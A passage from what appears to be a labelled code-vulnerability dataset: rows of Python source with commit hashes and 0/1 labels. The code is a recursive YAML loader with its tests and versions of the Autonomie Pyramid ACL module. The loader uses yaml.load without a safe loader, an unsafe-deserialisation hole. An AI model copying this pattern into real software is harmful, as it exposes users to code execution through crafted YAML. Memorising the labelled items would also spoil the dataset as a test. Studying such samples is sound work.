    elif os.path.isfile(path):
        if os.path.abspath(path) == os.path.abspath(sys.argv[0]):
            return None, None  # ignore script itself

        if path.endswith(YML_FILE_SUFFIX):
          bpath = bpath[:-len(YML_FILE_SUFFIX)]

          try:
              return bpath, yaml.load(open(path))
          except:
              return bpath, None
        else:
          return None, None
    else:  # not a normal file or not existant
        return None, None


def load_yml_filedir(root_dir):
    """""" load the given directory and return the data as a dict """"""
    data = _load_yml_filedir(root_dir)[1]
    return data


def dump_yml_filedir(root_dir):
    """""" load the given directory and print the data as formatted json """"""
    result = load_yml_filedir(root_dir)
    json.dump(result, sys.stdout, indent=2)


if __name__ == ""__main__"":
    root_dir = sys.argv[1] if len(sys.argv) > 1 else '.'
    dump_yml_filedir(root_dir)
/n/n/ntest/test_facts.py/n/nimport os.path

import pytest

import nestedfacts


@pytest.mark.parametrize(""inputfile,expected"", [
    ('single_file.yml', ['one', 'two', 'three!']),
    ('simple_dir', {'foo': 5, 'bar': 7}),
    ('nested_dir', {'foo': 5, 'bar': {'nesting': 'is awesome', 'or': ['is', 'it?']}}),
    ('invalid_file', {'foo': 42, 'invalid': None}),
    ('nonyaml_dir', {'foo': 43}),
    ('nonyaml_file', None),
    ('___doesnotexist', None),
])
def test_single_file(inputfile, expected):
    data = nestedfacts.load_yml_filedir(os.path.join(os.path.dirname(__file__), 'data', inputfile))
    assert data == expected
/n/n/n",0
121,a4989b4e38c2f3d0c225d04ce3213ba271a5ef08,"/nestedfacts.py/n/n#!/usr/bin/env python

import os
import os.path
import json
import sys
import yaml


def _load_yml_filedir(path):
    """"""
    Internal function. Do not use.
    Loads all YML-files from the given directory, recursively.
    This function excepts the path to exist.
    """"""
    YML_FILE_SUFFIX = '.yml'
    bpath = os.path.basename(path)

    if os.path.isdir(path):
        result = {}

        for entry in os.listdir(path):
            epath = os.path.join(path, entry)
            key, value = _load_yml_filedir(epath)

            if not key:
              continue

            result[key] = value

        return bpath, result
    elif os.path.isfile(path):
        if os.path.abspath(path) == os.path.abspath(sys.argv[0]):
            return None, None  # ignore script itself

        if path.endswith(YML_FILE_SUFFIX):
          bpath = bpath[:-len(YML_FILE_SUFFIX)]

          try:
              return bpath, yaml.load(open(path))
          except:
              return bpath, None
        else:
          return None, None



def load_yml_filedir(root_dir):
    """""" load the given directory and return the data as a dict """"""
    if os.path.exists(root_dir):
        return _load_yml_filedir(root_dir)[1]
    else:
        return {}


def dump_yml_filedir(root_dir):
    """""" load the given directory and print the data as formatted json """"""
    result = load_yml_filedir(root_dir)
    json.dump(result, sys.stdout, indent=2)


if __name__ == ""__main__"":
    root_dir = sys.argv[1] if len(sys.argv) > 1 else '.'
    dump_yml_filedir(root_dir)
/n/n/n/test/test_facts.py/n/nimport os.path

import pytest

import nestedfacts


@pytest.mark.parametrize(""inputfile,expected"", [
    ('single_file.yml', ['one', 'two', 'three!']),
    ('simple_dir', {'foo': 5, 'bar': 7}),
    ('nested_dir', {'foo': 5, 'bar': {'nesting': 'is awesome', 'or': ['is', 'it?']}}),
    ('invalid_file', {'foo': 42, 'invalid': None}),
    ('nonyaml_dir', {'foo': 43}),
    ('nonyaml_file', None),
    ('___doesnotexist', {}),
])
def test_single_file(inputfile, expected):
    data = nestedfacts.load_yml_filedir(os.path.join(os.path.dirname(__file__), 'data', inputfile))
    assert data == expected
/n/n/n",1
122,17d12fae5fa1e604253741882886ea12bced3950,"autonomie/utils/security.py/n/n# -*- coding: utf-8 -*-
# * Copyright (C) 2012-2013 Croissance Commune
# * Authors:
#       * Arezki Feth <f.a@majerti.fr>;
#       * Miotte Julien <j.m@majerti.fr>;
#       * Pettier Gabriel;
#       * TJEBBES Gaston <g.t@majerti.fr>
#
# This file is part of Autonomie : Progiciel de gestion de CAE.
#
#    Autonomie is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    Autonomie is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with Autonomie.  If not, see <http://www.gnu.org/licenses/>.
#

""""""
    Root factory <=> Acl handling
""""""
from pyramid.security import (
    Allow,
    Deny,
    Everyone,
    Authenticated,
    ALL_PERMISSIONS,
)
from sqlalchemy.orm import undefer_group

from autonomie.models.config import ConfigFiles
from autonomie.models.activity import Activity
from autonomie.models.company import Company
from autonomie.models.competence import (
    CompetenceGrid,
    CompetenceGridItem,
    CompetenceGridSubItem,
)
from autonomie.models.customer import Customer
from autonomie.models.files import (
    File,
    Template,
    TemplatingHistory,
)
from autonomie.models.project import (
    Project,
    Phase,
)
from autonomie.models.task.task import (
    TaskLine,
    TaskLineGroup,
    DiscountLine,
)
from autonomie.models.task.estimation import (
    PaymentLine,
)
from autonomie.models.task.estimation import Estimation
from autonomie.models.task.invoice import (
    Invoice,
    CancelInvoice,
    Payment,
)
from autonomie.models.workshop import (
    Workshop,
    Timeslot,
)
from autonomie.models.expense import (
    ExpenseSheet,
    ExpensePayment,
    ExpenseType,
    ExpenseKmType,
    ExpenseTelType,
)
from autonomie.models.user import (
    User,
    UserDatas,
)
from autonomie_celery.models import (
    Job,
)
from autonomie.models.statistics import (
    StatisticSheet,
    StatisticEntry,
    BaseStatisticCriterion,
)
from autonomie.models.sale_product import (
    SaleProduct,
    SaleProductGroup,
    SaleProductCategory,
)
from autonomie.models.tva import Tva


DEFAULT_PERM = [
    (Allow, ""group:admin"", ALL_PERMISSIONS, ),
    (Deny, ""group:manager"", ('admin',)),
    (Allow, ""group:manager"", ALL_PERMISSIONS, ),
    (Allow, ""group:contractor"", ('visit',), ),
]
DEFAULT_PERM_NEW = [
    (Allow, ""group:admin"", ('admin', 'manage', 'admin_treasury')),
    (Allow, ""group:manager"", ('manage', 'admin_treasury')),
]


class RootFactory(dict):
    """"""
       Ressource factory, returns the appropriate resource regarding
       the request object
    """"""
    __name__ = ""root""

    @property
    def __acl__(self):
        """"""
            Default permissions
        """"""
        acl = DEFAULT_PERM[:]
        acl.append((Allow, Authenticated, 'view',))
        return acl

    def __init__(self, request):
        self.request = request

        for traversal_name, object_name, factory in (
            (""activities"", ""activity"", Activity, ),
            ('cancelinvoices', 'cancelinvoice', CancelInvoice, ),
            ('companies', 'company', Company, ),
            ('competences', 'competence', CompetenceGrid, ),
            ('competence_items', 'competence_item', CompetenceGridItem, ),
            ('competence_subitems', 'competence_subitem',
             CompetenceGridSubItem, ),
            ('customers', 'customer', Customer, ),
            ('discount_lines', 'discount_line', DiscountLine,),
            ('estimations', 'estimation', Estimation, ),
            ('expenses', 'expense', ExpenseSheet, ),
            (
                'expense_types_expenses',
                'expense_types_expense',
                ExpenseType
            ),
            (
                'expense_types_expensekms',
                'expense_types_expensekm',
                ExpenseKmType
            ),
            (
                'expense_types_expensetels',
                'expense_types_expensetel',
                ExpenseTelType
            ),
            ('expense_payments', 'expense_payment', ExpensePayment, ),
            ('files', 'file', File, ),
            ('invoices', 'invoice', Invoice, ),
            ('jobs', 'job', Job, ),
            ('payments', 'payment', Payment, ),
            ('payment_lines', 'payment_line', PaymentLine,),
            ('phases', 'phase', Phase, ),
            ('projects', 'project', Project, ),
            ('sale_categories', 'sale_category', SaleProductCategory, ),
            ('sale_products', 'sale_product', SaleProduct, ),
            ('sale_product_groups', 'sale_product_group', SaleProductGroup, ),
            ('statistics', 'statistic', StatisticSheet,),
            ('statistic_entries', 'statistic_entry', StatisticEntry,),
            ('statistic_criteria', 'statistic_criterion',
             BaseStatisticCriterion,),
            ('task_lines', 'task_line', TaskLine),
            ('task_line_groups', 'task_line_group', TaskLineGroup),
            ('templates', 'template', Template, ),
            ('templatinghistory', 'templatinghistory', TemplatingHistory, ),
            ('timeslots', 'timeslot', Timeslot, ),
            ('tvas', 'tva', Tva,),
            ('users', 'user', User, ),
            ('userdatas', 'userdatas', UserDatas, ),
            ('workshops', 'workshop', Workshop, ),
        ):

            self[traversal_name] = TraversalDbAccess(
                self,
                traversal_name,
                object_name,
                factory,
            )

        self['configfiles'] = TraversalDbAccess(
            self, 'configfiles', 'config_file', ConfigFiles, 'key'
        )


class TraversalDbAccess(object):
    """"""
        Class handling access to dbrelated objects
    """"""
    __acl__ = DEFAULT_PERM[:]
    dbsession = None

    def __init__(self, parent, traversal_name, object_name, factory,
                 id_key='id'):
        self.__parent__ = parent
        self.factory = factory
        self.object_name = object_name
        self.__name__ = traversal_name
        self.id_key = id_key

    def __getitem__(self, key):
        return self._get_item(self.factory, key, self.object_name)

    def _get_item(self, klass, key, object_name):
        assert self.dbsession is not None, ""Missing dbsession""

        dbsession = self.dbsession()
        obj = dbsession.query(klass)\
                       .options(undefer_group('edit'))\
                       .filter(getattr(klass, self.id_key) == key)\
                       .scalar()

        if obj is None:
            raise KeyError

        obj.__name__ = object_name
        return obj


def get_base_acl(self):
    """"""
        return the base acl
    """"""
    acl = DEFAULT_PERM[:]
    acl.append(
        (
            Allow,
            Authenticated,
            'view',
        )
    )
    return acl


def get_userdatas_acl(self):
    """"""
    Return the acl for userdatas
    only the related account has view rights
    """"""
    acl = DEFAULT_PERM[:]
    if self.user is not None:
        acl.append(
            (
                Allow,
                self.user.login,
                (
                    'view',
                    'view.file',
                )
            ),
        )
    return acl


def get_event_acl(self):
    """"""
    Return acl fr events participants can view
    """"""
    acl = DEFAULT_PERM[:]
    for user in self.participants:
        acl.append(
            (
                Allow,
                user.login,
                (""view_activity"", ""view_workshop"", ""view.file"")
            )
        )
    return acl


def get_activity_acl(self):
    """"""
    Return acl for activities : companies can also view
    """"""
    acl = get_event_acl(self)
    for companies in self.companies:
        for user in companies.employees:
            acl.append(
                (
                    Allow,
                    user.login,
                    (""view_activity"", ""view.file"")
                )
            )
    return acl


def get_company_acl(self):
    """"""
        Compute the company's acl
    """"""
    acl = DEFAULT_PERM[:]
    acl.extend(
        [(
            Allow,
            user.login,
            (
                ""view_company"",
                ""edit_company"",
                # for logo and header
                ""view.file"",
                ""list_customers"",
                ""add_customer"",
                ""list_projects"",
                ""add_project"",
                'list_estimations',
                ""list_invoices"",
                ""edit_commercial_handling"",
                ""list_expenses"",
                ""add.expense"",
                ""list_sale_products"",
                ""add_sale_product"",
                ""list_treasury_files"",
                # Accompagnement
                ""list_activities"",
                ""list_workshops"",
            )
        )for user in self.employees]
    )
    return acl


def get_user_acl(self):
    """"""
        Get acl for user account edition
    """"""
    acl = DEFAULT_PERM[:]
    if self.enabled():
        acl.append(
            (
                Allow,
                self.login,
                (
                    ""view_user"",
                    ""edit_user"",
                    'list_holidays',
                    'add_holiday',
                    'edit_holiday',
                    'list_competences',
                )
            )
        )
        acl.append((Allow, Authenticated, ('visit')))
    return acl


def _get_user_status_acl(self):
    """"""
    Return the common status related acls
    """"""
    acl = []

    for user in self.company.employees:
        perms = (
            'view.%s' % self.type_,
            'view.file',
            'add.file',
            'edit.file',
        )

        if self.status in ('draft', 'invalid'):
            perms += (
                'edit.%s' % self.type_,
                'wait.%s' % self.type_,
                'delete.%s' % self.type_,
                'draft.%s' % self.type_,
            )
        if self.status in ('wait',):
            perms += ('draft.%s' % self.type_,)

        acl.append((Allow, user.login, perms))
    return acl


def _get_admin_status_acl(self):
    """"""
    Return the common status related acls
    """"""
    perms = (
        'view.%s' % self.type_,
        'admin.%s' % self.type_,
        'view.file',
        'add.file',
        'edit.file',
    )

    if self.status in ('draft', 'wait', 'invalid'):
        perms += (
            'edit.%s' % self.type_,
            'valid.%s' % self.type_,
            'delete.%s' % self.type_,
            'draft.%s' % self.type_,
        )
        if self.status == 'wait':
            perms += ('invalid.%s' % self.type_,)

    return [
        (Allow, 'group:admin', perms),
        (Allow, 'group:manager', perms),
    ]


def get_estimation_default_acl(self):
    """"""
    Return acl for the estimation handling

    :returns: A pyramid acl list
    :rtype: list
    """"""
    acl = DEFAULT_PERM_NEW[:]

    acl.extend(_get_admin_status_acl(self))
    admin_perms = ()

    if self.status == 'valid' and self.signed_status != 'aborted':
        admin_perms += ('geninv.estimation',)

    if self.status == 'valid':
        admin_perms += ('set_signed_status.estimation',)

    if self.status == 'valid' and self.signed_status != 'signed' and not \
            self.geninv:
        admin_perms += ('set_date.estimation',)

    if admin_perms:
        acl.append((Allow, ""group:admin"", admin_perms))
        acl.append((Allow, ""group:manager"", admin_perms))

    # Common estimation access acl
    if self.status != 'valid':
        acl.append(
            (Allow, ""group:estimation_validation"", ('valid.estimation',))
        )
        acl.append((Deny, ""group:estimation_validation"", ('wait.estimation',)))

    acl.extend(_get_user_status_acl(self))

    for user in self.company.employees:
        perms = ()

        if self.status == 'valid':
            perms += ('set_signed_status.estimation', )
            if not self.signed_status == 'aborted':
                perms += ('geninv.estimation',)

        if perms:
            acl.append((Allow, user.login, perms))
    return acl


def get_invoice_default_acl(self):
    """"""
    Return the acl for invoices

    :returns: A pyramid acl list
    :rtype: list
    """"""
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()

    if self.status == 'valid' and self.paid_status != 'resulted':
        admin_perms += ('gencinv.invoice', 'add_payment.invoice',)

    if self.status == 'valid' and self.paid_status == 'waiting' \
            and not self.exported:
        admin_perms += ('set_date.invoice',)

    if not self.exported:
        admin_perms += ('set_treasury.invoice',)

    if admin_perms:
        acl.append((Allow, ""group:admin"", admin_perms))
        acl.append((Allow, ""group:manager"", admin_perms))

    if self.status != 'valid':
        acl.append((Allow, ""group:invoice_validation"", ('valid.invoice',)))
        acl.append((Deny, ""group:invoice_validation"", ('wait.invoice',)))

    if self.status == 'valid' and self.paid_status != 'resulted':
        acl.append((Allow, ""group:payment_admin"", ('add_payment.invoice',)))

    acl.extend(_get_user_status_acl(self))

    for user in self.company.employees:
        perms = ()
        if self.status == 'valid' and self.paid_status != 'resulted':
            perms += ('gencinv.invoice',)

        if perms:
            acl.append((Allow, user.login, perms))

    return acl


def get_cancelinvoice_default_acl(self):
    """"""
    Return the acl for cancelinvoices
    """"""
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()
    if not self.exported and self.status == 'valid':
        admin_perms += ('set_treasury.cancelinvoice', 'set_date.cancelinvoice')

    if admin_perms:
        acl.append((Allow, ""group:admin"", admin_perms))
        acl.append((Allow, ""group:manager"", admin_perms))

    if self.status != 'valid':
        acl.append(
            (Allow, ""group:invoice_validation"", ('valid.cancelinvoice',))
        )
        acl.append((Deny, ""group:invoice_validation"", ('wait.cancelinvoice',)))

    acl.extend(_get_user_status_acl(self))
    return acl


def get_task_line_group_acl(self):
    """"""
    Return the task line acl
    """"""
    return self.task.__acl__


def get_task_line_acl(self):
    """"""
    Return the task line acl
    """"""
    return self.group.__acl__


def get_discount_line_acl(self):
    """"""
    Return the acls for accessing the discount line
    """"""
    return self.task.__acl__


def get_payment_line_acl(self):
    """"""
    Return the acls for accessing a payment line
    """"""
    return self.task.__acl__


def get_expense_sheet_default_acl(self):
    """"""
    Compute the expense Sheet acl

    view
    edit
    add_payment

    wait
    valid
    invalid
    delete

    add.file
    edit.file
    view.file

    :returns: Pyramid acl
    :rtype: list
    """"""
    acl = DEFAULT_PERM_NEW[:]
    acl.extend(_get_admin_status_acl(self))

    admin_perms = ()
    if not self.exported:
        admin_perms += ('set_treasury.expensesheet',)

    if self.status == 'valid' and self.paid_status != 'resulted':
        admin_perms += ('add_payment.expensesheet',)

    if admin_perms:
        acl.append((Allow, ""group:admin"", admin_perms))
        acl.append((Allow, ""group:manager"", admin_perms))

    acl.extend(_get_user_status_acl(self))

    return acl


def get_payment_default_acl(self):
    """"""
    Compute the acl for a Payment object

    view
    edit
    """"""
    acl = DEFAULT_PERM_NEW[:]

    admin_perms = ('view.payment',)
    if not self.exported:
        admin_perms += ('edit.payment',)

    acl.append((Allow, 'group:admin', admin_perms))
    acl.append((Allow, 'group:manager', admin_perms))
    acl.append((Allow, 'group:payment_admin', admin_perms))

    for user in self.task.company.employees:
        acl.append((Allow, user.login, ('view.payment',)))

    return acl


def get_expense_payment_acl(self):
    """"""
    Compute the acl for an Expense Payment object

    view
    edit
    """"""
    acl = DEFAULT_PERM_NEW[:]
    admin_perms = ('view.expensesheet_payment',)
    if not self.exported:
        admin_perms += ('edit.expensesheet_payment',)

    acl.append((Allow, 'group:admin', admin_perms))
    acl.append((Allow, 'group:manager', admin_perms))

    for user in self.task.company.employees:
        acl.append((Allow, user.login, ('view.expensesheet_payment',)))

    return acl


def get_customer_acl(self):
    """"""
    Compute the customer's acl
    """"""
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (Allow, user.login, ('view_customer', 'edit_customer',))
        )
    return acl


def get_phase_acl(self):
    """"""
    Return acl for a phase
    """"""
    return get_project_acl(self.project)


def get_project_acl(self):
    """"""
    Return acl for a project
    """"""
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (
                Allow,
                user.login,
                (
                    'view_project',
                    'edit_project',
                    'add_project',
                    'edit_phase',
                    'add_phase',
                    'add_estimation',
                    'add_invoice',
                    'list_estimations',
                    'list_invoices',
                    'view.file',
                    'add.file',
                    'edit.file',
                )
            )
        )

    return acl


def get_file_acl(self):
    """"""
    Compute the acl for a file object
    a file object's acl are simply the parent's
    """"""
    if self.parent is not None:
        return self.parent.__acl__
    # Exceptions: headers and logos are not attached throught the Node's parent
    # rel
    elif self.company_header_backref is not None:
        return self.company_header_backref.__acl__
    elif self.company_logo_backref is not None:
        return self.company_logo_backref.__acl__
    else:
        return []


def get_product_acl(self):
    """"""
    Return the acl for a product : A product's acl is given by its category
    """"""
    acl = DEFAULT_PERM[:]
    for user in self.company.employees:
        acl.append(
            (
                Allow,
                user.login,
                (
                    'list_sale_products',
                    'view_sale_product',
                    'edit_sale_product',
                )
            )
        )
    return acl


def get_competence_acl(self):
    """"""
    Return acl for the Competence Grids objects
    """"""
    acl = DEFAULT_PERM[:]
    login = self.contractor.login
    acl.append(
        (
            Allow,
            u'%s' % login,
            (
                ""view_competence"",
                ""edit_competence""
            )
        )
    )
    return acl


def set_models_acl():
    """"""
    Add acl to the db objects used as context

    Here acl are set globally, but we'd like to set things more dynamically
    when different roles will be implemented
    """"""
    Activity.__default_acl__ = property(get_activity_acl)
    CancelInvoice.__default_acl__ = property(get_cancelinvoice_default_acl)
    Company.__default_acl__ = property(get_company_acl)
    CompetenceGrid.__acl__ = property(get_competence_acl)
    CompetenceGridItem.__acl__ = property(get_competence_acl)
    CompetenceGridSubItem.__acl__ = property(get_competence_acl)
    ConfigFiles.__default_acl__ = [(Allow, Everyone, 'view'), ]
    Customer.__default_acl__ = property(get_customer_acl)
    DiscountLine.__acl__ = property(get_discount_line_acl)
    Estimation.__default_acl__ = property(get_estimation_default_acl)
    ExpenseSheet.__default_acl__ = property(get_expense_sheet_default_acl)
    ExpensePayment.__default_acl__ = property(get_expense_payment_acl)
    File.__default_acl__ = property(get_file_acl)
    Invoice.__default_acl__ = property(get_invoice_default_acl)
    Job.__default_acl__ = DEFAULT_PERM[:]
    Payment.__default_acl__ = property(get_payment_default_acl)
    PaymentLine.__acl__ = property(get_payment_line_acl)
    Phase.__acl__ = property(get_phase_acl)
    Project.__default_acl__ = property(get_project_acl)
    SaleProductCategory.__acl__ = property(get_product_acl)
    SaleProduct.__acl__ = property(get_product_acl)
    SaleProductGroup.__acl__ = property(get_product_acl)
    StatisticSheet.__acl__ = property(get_base_acl)
    StatisticEntry.__acl__ = property(get_base_acl)
    BaseStatisticCriterion.__acl__ = property(get_base_acl)
    TaskLine.__acl__ = property(get_task_line_acl)
    TaskLineGroup.__acl__ = property(get_task_line_group_acl)
    Template.__default_acl__ = property(get_base_acl)
    TemplatingHistory.__default_acl__ = property(get_base_acl)
    Timeslot.__default_acl__ = property(get_base_acl)
    User.__default_acl__ = property(get_user_acl)
    UserDatas.__default_acl__ = property(get_userdatas_acl)
    Workshop.__default_acl__ = property(get_event_acl)

    Tva.__acl__ = property(get_base_acl)
    ExpenseType.__acl__ = property(get_base_acl)
    ExpenseKmType.__acl__ = property(get_base_acl)
    ExpenseTelType.__acl__ = property(get_base_acl)
/n/n/n",0
123,17d12fae5fa1e604253741882886ea12bced3950,"/autonomie/utils/security.py/n/n# -*- coding: utf-8 -*-
# * Copyright (C) 2012-2013 Croissance Commune
# * Authors:
#       * Arezki Feth <f.a@majerti.fr>;
#       * Miotte Julien <j.m@majerti.fr>;
#       * Pettier Gabriel;
#       * TJEBBES Gaston <g.t@majerti.fr>
#
# This file is part of Autonomie : Progiciel de gestion de CAE.
#
#    Autonomie is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    Autonomie is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with Autonomie.  If not, see <http://www.gnu.org/licenses/>.
#

""""""
    Root factory <=> Acl handling
""""""
from pyramid.security import (
    Allow,
    Deny,
    Everyone,
    Authenticated,
    ALL_PERMISSIONS,
)
from sqlalchemy.orm import undefer_group

from autonomie.models.config import ConfigFiles
from autonomie.models.activity import Activity
from autonomie.models.company import Company
from autonomie.models.competence import (
    CompetenceGrid,
    CompetenceGridItem,
    CompetenceGridSubItem,
)
from autonomie.models.customer import Customer
from autonomie.models.files import (
    File,
    Template,
    TemplatingHistory,
)
from autonomie.models.project import (
    Project,
    Phase,
)
from autonomie.models.task.task import (
    TaskLine,
    TaskLineGroup,
    DiscountLine,
)
from autonomie.models.task.estimation import (
    PaymentLine,
)
from autonomie.models.task.estimation import Estimation
from autonomie.models.task.invoice import (
    Invoice,
    CancelInvoice,
    Payment,
)
from autonomie.models.workshop import (
    Workshop,
    Timeslot,
)
from autonomie.models.expense import (
    ExpenseSheet,
    ExpensePayment,
    ExpenseType,
    ExpenseKmType,
    ExpenseTelType,
)
from autonomie.models.user import (
    User,
    UserDatas,
)
from autonomie_celery.models import (
    Job,
)
from autonomie.models.statistics import (
    StatisticSheet,
    StatisticEntry,
    BaseStatisticCriterion,
)
from autonomie.models.sale_product import (
    SaleProduct,
    SaleProductGroup,
    SaleProductCategory,
)
from autonomie.models.tva import Tva


DEFAULT_PERM = [
    (Allow, ""group:admin"", ALL_PERMISSIONS, ),
    (Deny, ""group:manager"", ('admin',)),
    (Allow, ""group:manager"", ALL_PERMISSIONS, ),
    (Allow, ""group:contractor"", ('visit',), ),
]
DEFAULT_PERM_NEW = [
    (Allow, ""group:admin"", ('admin', 'manage', 'admin_treasury')),
    (Allow, ""group:manager"", ('manage', 'admin_treasury')),
]


class RootFactory(dict):
    """"""
       Ressource factory, returns the appropriate resource regarding
       the request object
    """"""
    __name__ = ""root""

    @property
    def __acl__(self):
        """"""
            Default permissions
        """"""
        acl = DEFAULT_PERM[:]
        acl.append((Allow, Authenticated, 'view',))
        return acl

    def __init__(self, request):
        self.request = request

        for traversal_name, object_name, factory in (
            (""activities"", ""activity"", Activity, ),
            ('cancelinvoices', 'cancelinvoice', CancelInvoice, ),
            ('companies', 'company', Company, ),
            ('competences', 'competence', CompetenceGrid, ),
            ('competence_items', 'competence_item', CompetenceGridItem, ),
            ('competence_subitems', 'competence_subitem',
             CompetenceGridSubItem, ),
            ('customers', 'customer', Customer, ),
            ('estimations', 'estimation', Estimation, ),
            ('expenses', 'expense', ExpenseSheet, ),
            (
                'expense_types_expenses',
                'expense_types_expense',
                ExpenseType
            ),
            (
                'expense_types_expensekms',
                'expense_types_expensekm',
                ExpenseKmType
            ),
            (
                'expense_types_expensetels',
                'expense_types_expensetel',
                ExpenseTelType
            ),
            ('expense_payments', 'expense_payment', ExpensePayment, ),
            ('files', 'file', File, ),
            ('invoices', 'invoice', Invoice, ),
            ('jobs', 'job', Job, ),
            ('payments', 'payment', Payment, ),
            ('phases', 'phase', Phase, ),
            ('projects', 'project', Project, ),
            ('sale_categories', 'sale_category', SaleProductCategory, ),
            ('sale_products', 'sale_product', SaleProduct, ),
            ('sale_product_groups', 'sale_product_group', SaleProductGroup, ),
            ('statistics', 'statistic', StatisticSheet,),
            ('statistic_entries', 'statistic_entry', StatisticEntry,),
            ('statistic_criteria', 'statistic_criterion',
             BaseStatisticCriterion,),
            ('task_line', 'task_line', TaskLine),
            ('task_line_group', 'task_line_group', TaskLineGroup),
            ('templates', 'template', Template, ),
            ('templatinghistory', 'templatinghistory', TemplatingHistory, ),
            ('timeslots', 'timeslot', Timeslot, ),
            ('tvas', 'tva', Tva,),
            ('users', 'user', User, ),
            ('userdatas', 'userdatas', UserDatas, ),
            ('workshops', 'workshop', Workshop, ),
        ):

            self[traversal_name] = TraversalDbAccess(
                self,
                traversal_name,
                object_name,
                factory,
            )

        self['configfiles'] = TraversalDbAccess(
            self, 'configfiles', 'config_file', ConfigFiles, 'key'
        )


class TraversalDbAccess(object):
    """"""
        Class handling access to dbrelated objects
    """"""
    __acl__ = DEFAULT_PERM[:]
    dbsession = None

    def __init__(self, parent, traversal_name, object_name, factory,
                 id_key='id'):
        self.__parent__ = parent
        self.factory = factory
        self.object_name = object_name
        self.__name__ = traversal_name
        self.id_key = id_key

    def __getitem__(self, key):
        return self._get_item(self.factory, key, self.object_name)

    def _get_item(self, klass, key, object_name):
        assert self.dbsession is not None, ""Missing dbsession""

        dbsession = self.dbsession()
        obj = dbsession.query(klass)\
                       .options(undefer_group('edit'))\
                       .filter(getattr(klass, self.id_key) == key)\
                       .scalar()

        if obj is None:
            raise KeyError

        obj.__name__ = object_name
        return obj


def get_base_acl(self):
    """"""
        return the base acl
    """"""
    acl = DEFAULT_PERM[:]
    acl.append(
        (
            Allow,
            Authenticated,
            'view',
        )
    )
    return acl


def get_userdatas_acl(self):
    """"""
    Return the acl for userdatas
    only the related account has view rights
    """"""
    acl = DEFAULT_PERM[:]
    if self.user is not None:
        acl.append(
            (
                Allow,
                self.user.login,
                (
                    'view',
                    'view.file',
                )
            ),
        )
    return acl


def get_event_acl(self):
    """"""
    Return acl fr events participants can view
    """"""
    acl = DEFAULT_PERM[:]
    for user in self.participants:
        acl.append(
            (
                Allow,
                user.login,
                (""view_activity"", ""view_workshop"", ""view.file"")
            )
        )
    return acl


def get_activity_acl(self):
    """"""
    Return acl for activities : companies can also view
    """"""
    acl = get_event_acl(self)
    for companies in self.companies:
        for user in companies.employees:
            acl.append(
                (
                    Allow,
                    user.login,
                    (""view_activity"", ""view.file"")
                )
            )
    return acl


def get_company_acl(self):
    """"""
        Compute the company's acl
    """"""
    acl = DEFAULT_PERM[:]
    acl.extend(
        [(
            Allow,
            user.login,
            (
                ""view_company"",
                ""edit_company"",
                # for logo and header
                ""view.file"",
                ""list_customers"",
                ""add_customer"",
                ""list_projects"",
                ""add_project"",
                'list_estimations',
                ""list_invoices"",
                ""edit_commercial_handling"",
                ""list_expenses"",
                ""add.expense"",
                ""list_sale_products"",
                ""add_sale_product"",
                ""list_treasury_files"",
                # Accompagnement
                ""list_activities"",
                ""list_workshops"",
            )
        )for user in self.employees]
    )
    return acl


def get_user_acl(self):
    """"""
        Get acl for user account edition
    """"""
    acl = DEFAULT_PERM[:]
    if self.enabled():
        acl.append(
            (
                Allow,
                self.login,
                (
                    ""view_user"",
                    ""edit_user"",
                    'list_holidays',
                    'add_holiday',
                    'edit_holiday',
                    'list_competences',
                )
            )
        )
        acl.append((Allow, Authenticated, ('visit')))
    return acl


def _get_user_status_acl(self):
    """"""
    Return the common status related acls
    """"""
    acl = []

    for user in self.company.employees:
        perms = (
            'view.%s' % self.type_,
            'view.file',
            'add.file',
            'edit.file',
        )

        if self.status in ('draft', 'invalid'):
            perms += (
                'edit.%s' % self.type_,
                'wait.%s' % self.type_,
                'delete.%s' % self.type_,
                'draft.%s' % self.type_,
            )
        if self.status in ('wait',):
            perms += ('draft.%s' % self.type_,)

        acl.append((Allow, user.login, perms))
    return acl


def _get_admin_status_acl(self):
    """"""
    Return the common status related acls
    """"""
    perms = (
        'view.%s' % self.type_,
        'admin.%s' % self.type_,
        'view.file',
        'add.file',
        'edit.file',
    )

    if self.status in ('draft', 'wait', 'invalid'):
        perms += (
            'edit.%s' % self.type_,
            'valid.%s' % self.type_,
            'delete.%s' % self.type_,
            'draft.%s' % self.type_,
        )
        if self.status == 'wait':
            perms += ('invalid.%s' % self.type_,)

    return [
        (Allow, 'group:admin', perms),
        (Allow, 'group:manager', perms),
    ]


def get_estimation_default_acl(self):
    """"""
    Return acl for the estimation handling

    :returns: A pyramid acl list
    :rtype: list
    """"""
    acl = DEFAULT_PERM_NEW[:]

    acl.extend(_get_admin_status_acl(self))
    admin_perms = ()

    if self.status == 'valid' and self.signed_status != 'aborted':
        admin_perms += ('geninv.estimation',)

    if self.status == 'valid':
        admin_perms += ('set_signed_status.estimation',)

    if self.status == 'valid' and self.signed_status != 'signed' and not \
            self.geninv:
        admin_perms += ('set_date.estimation',)

    if admin_perms:
        acl.append((Allow, ""group:admin"", admin_perms))
        acl.append((Allow, ""group:manager"", admin_perms))

    # Common estimation access acl
    if self.status != 'valid':
        acl.append(
            (Allow, ""group:estimation_validation"", ('valid.estimation',))
        )
        acl.append((Deny, ""group:estimation_validation"", ('wait.estimation',)))

    acl.extend(_get_user_status_acl(self))

    for user in self.company.employees:
        perms = ()

        if self.status == 'valid':
            perms += ('set_signed_status.estimation', )
            if not self.signed_status == 'aborted':
                perms += ('geninv.estimation',)

        if perms:
            acl.append((Allow, user.login, perms))
    return acl


def get_invoice_default_acl(self):
    """"""
    Return the acl for invoices

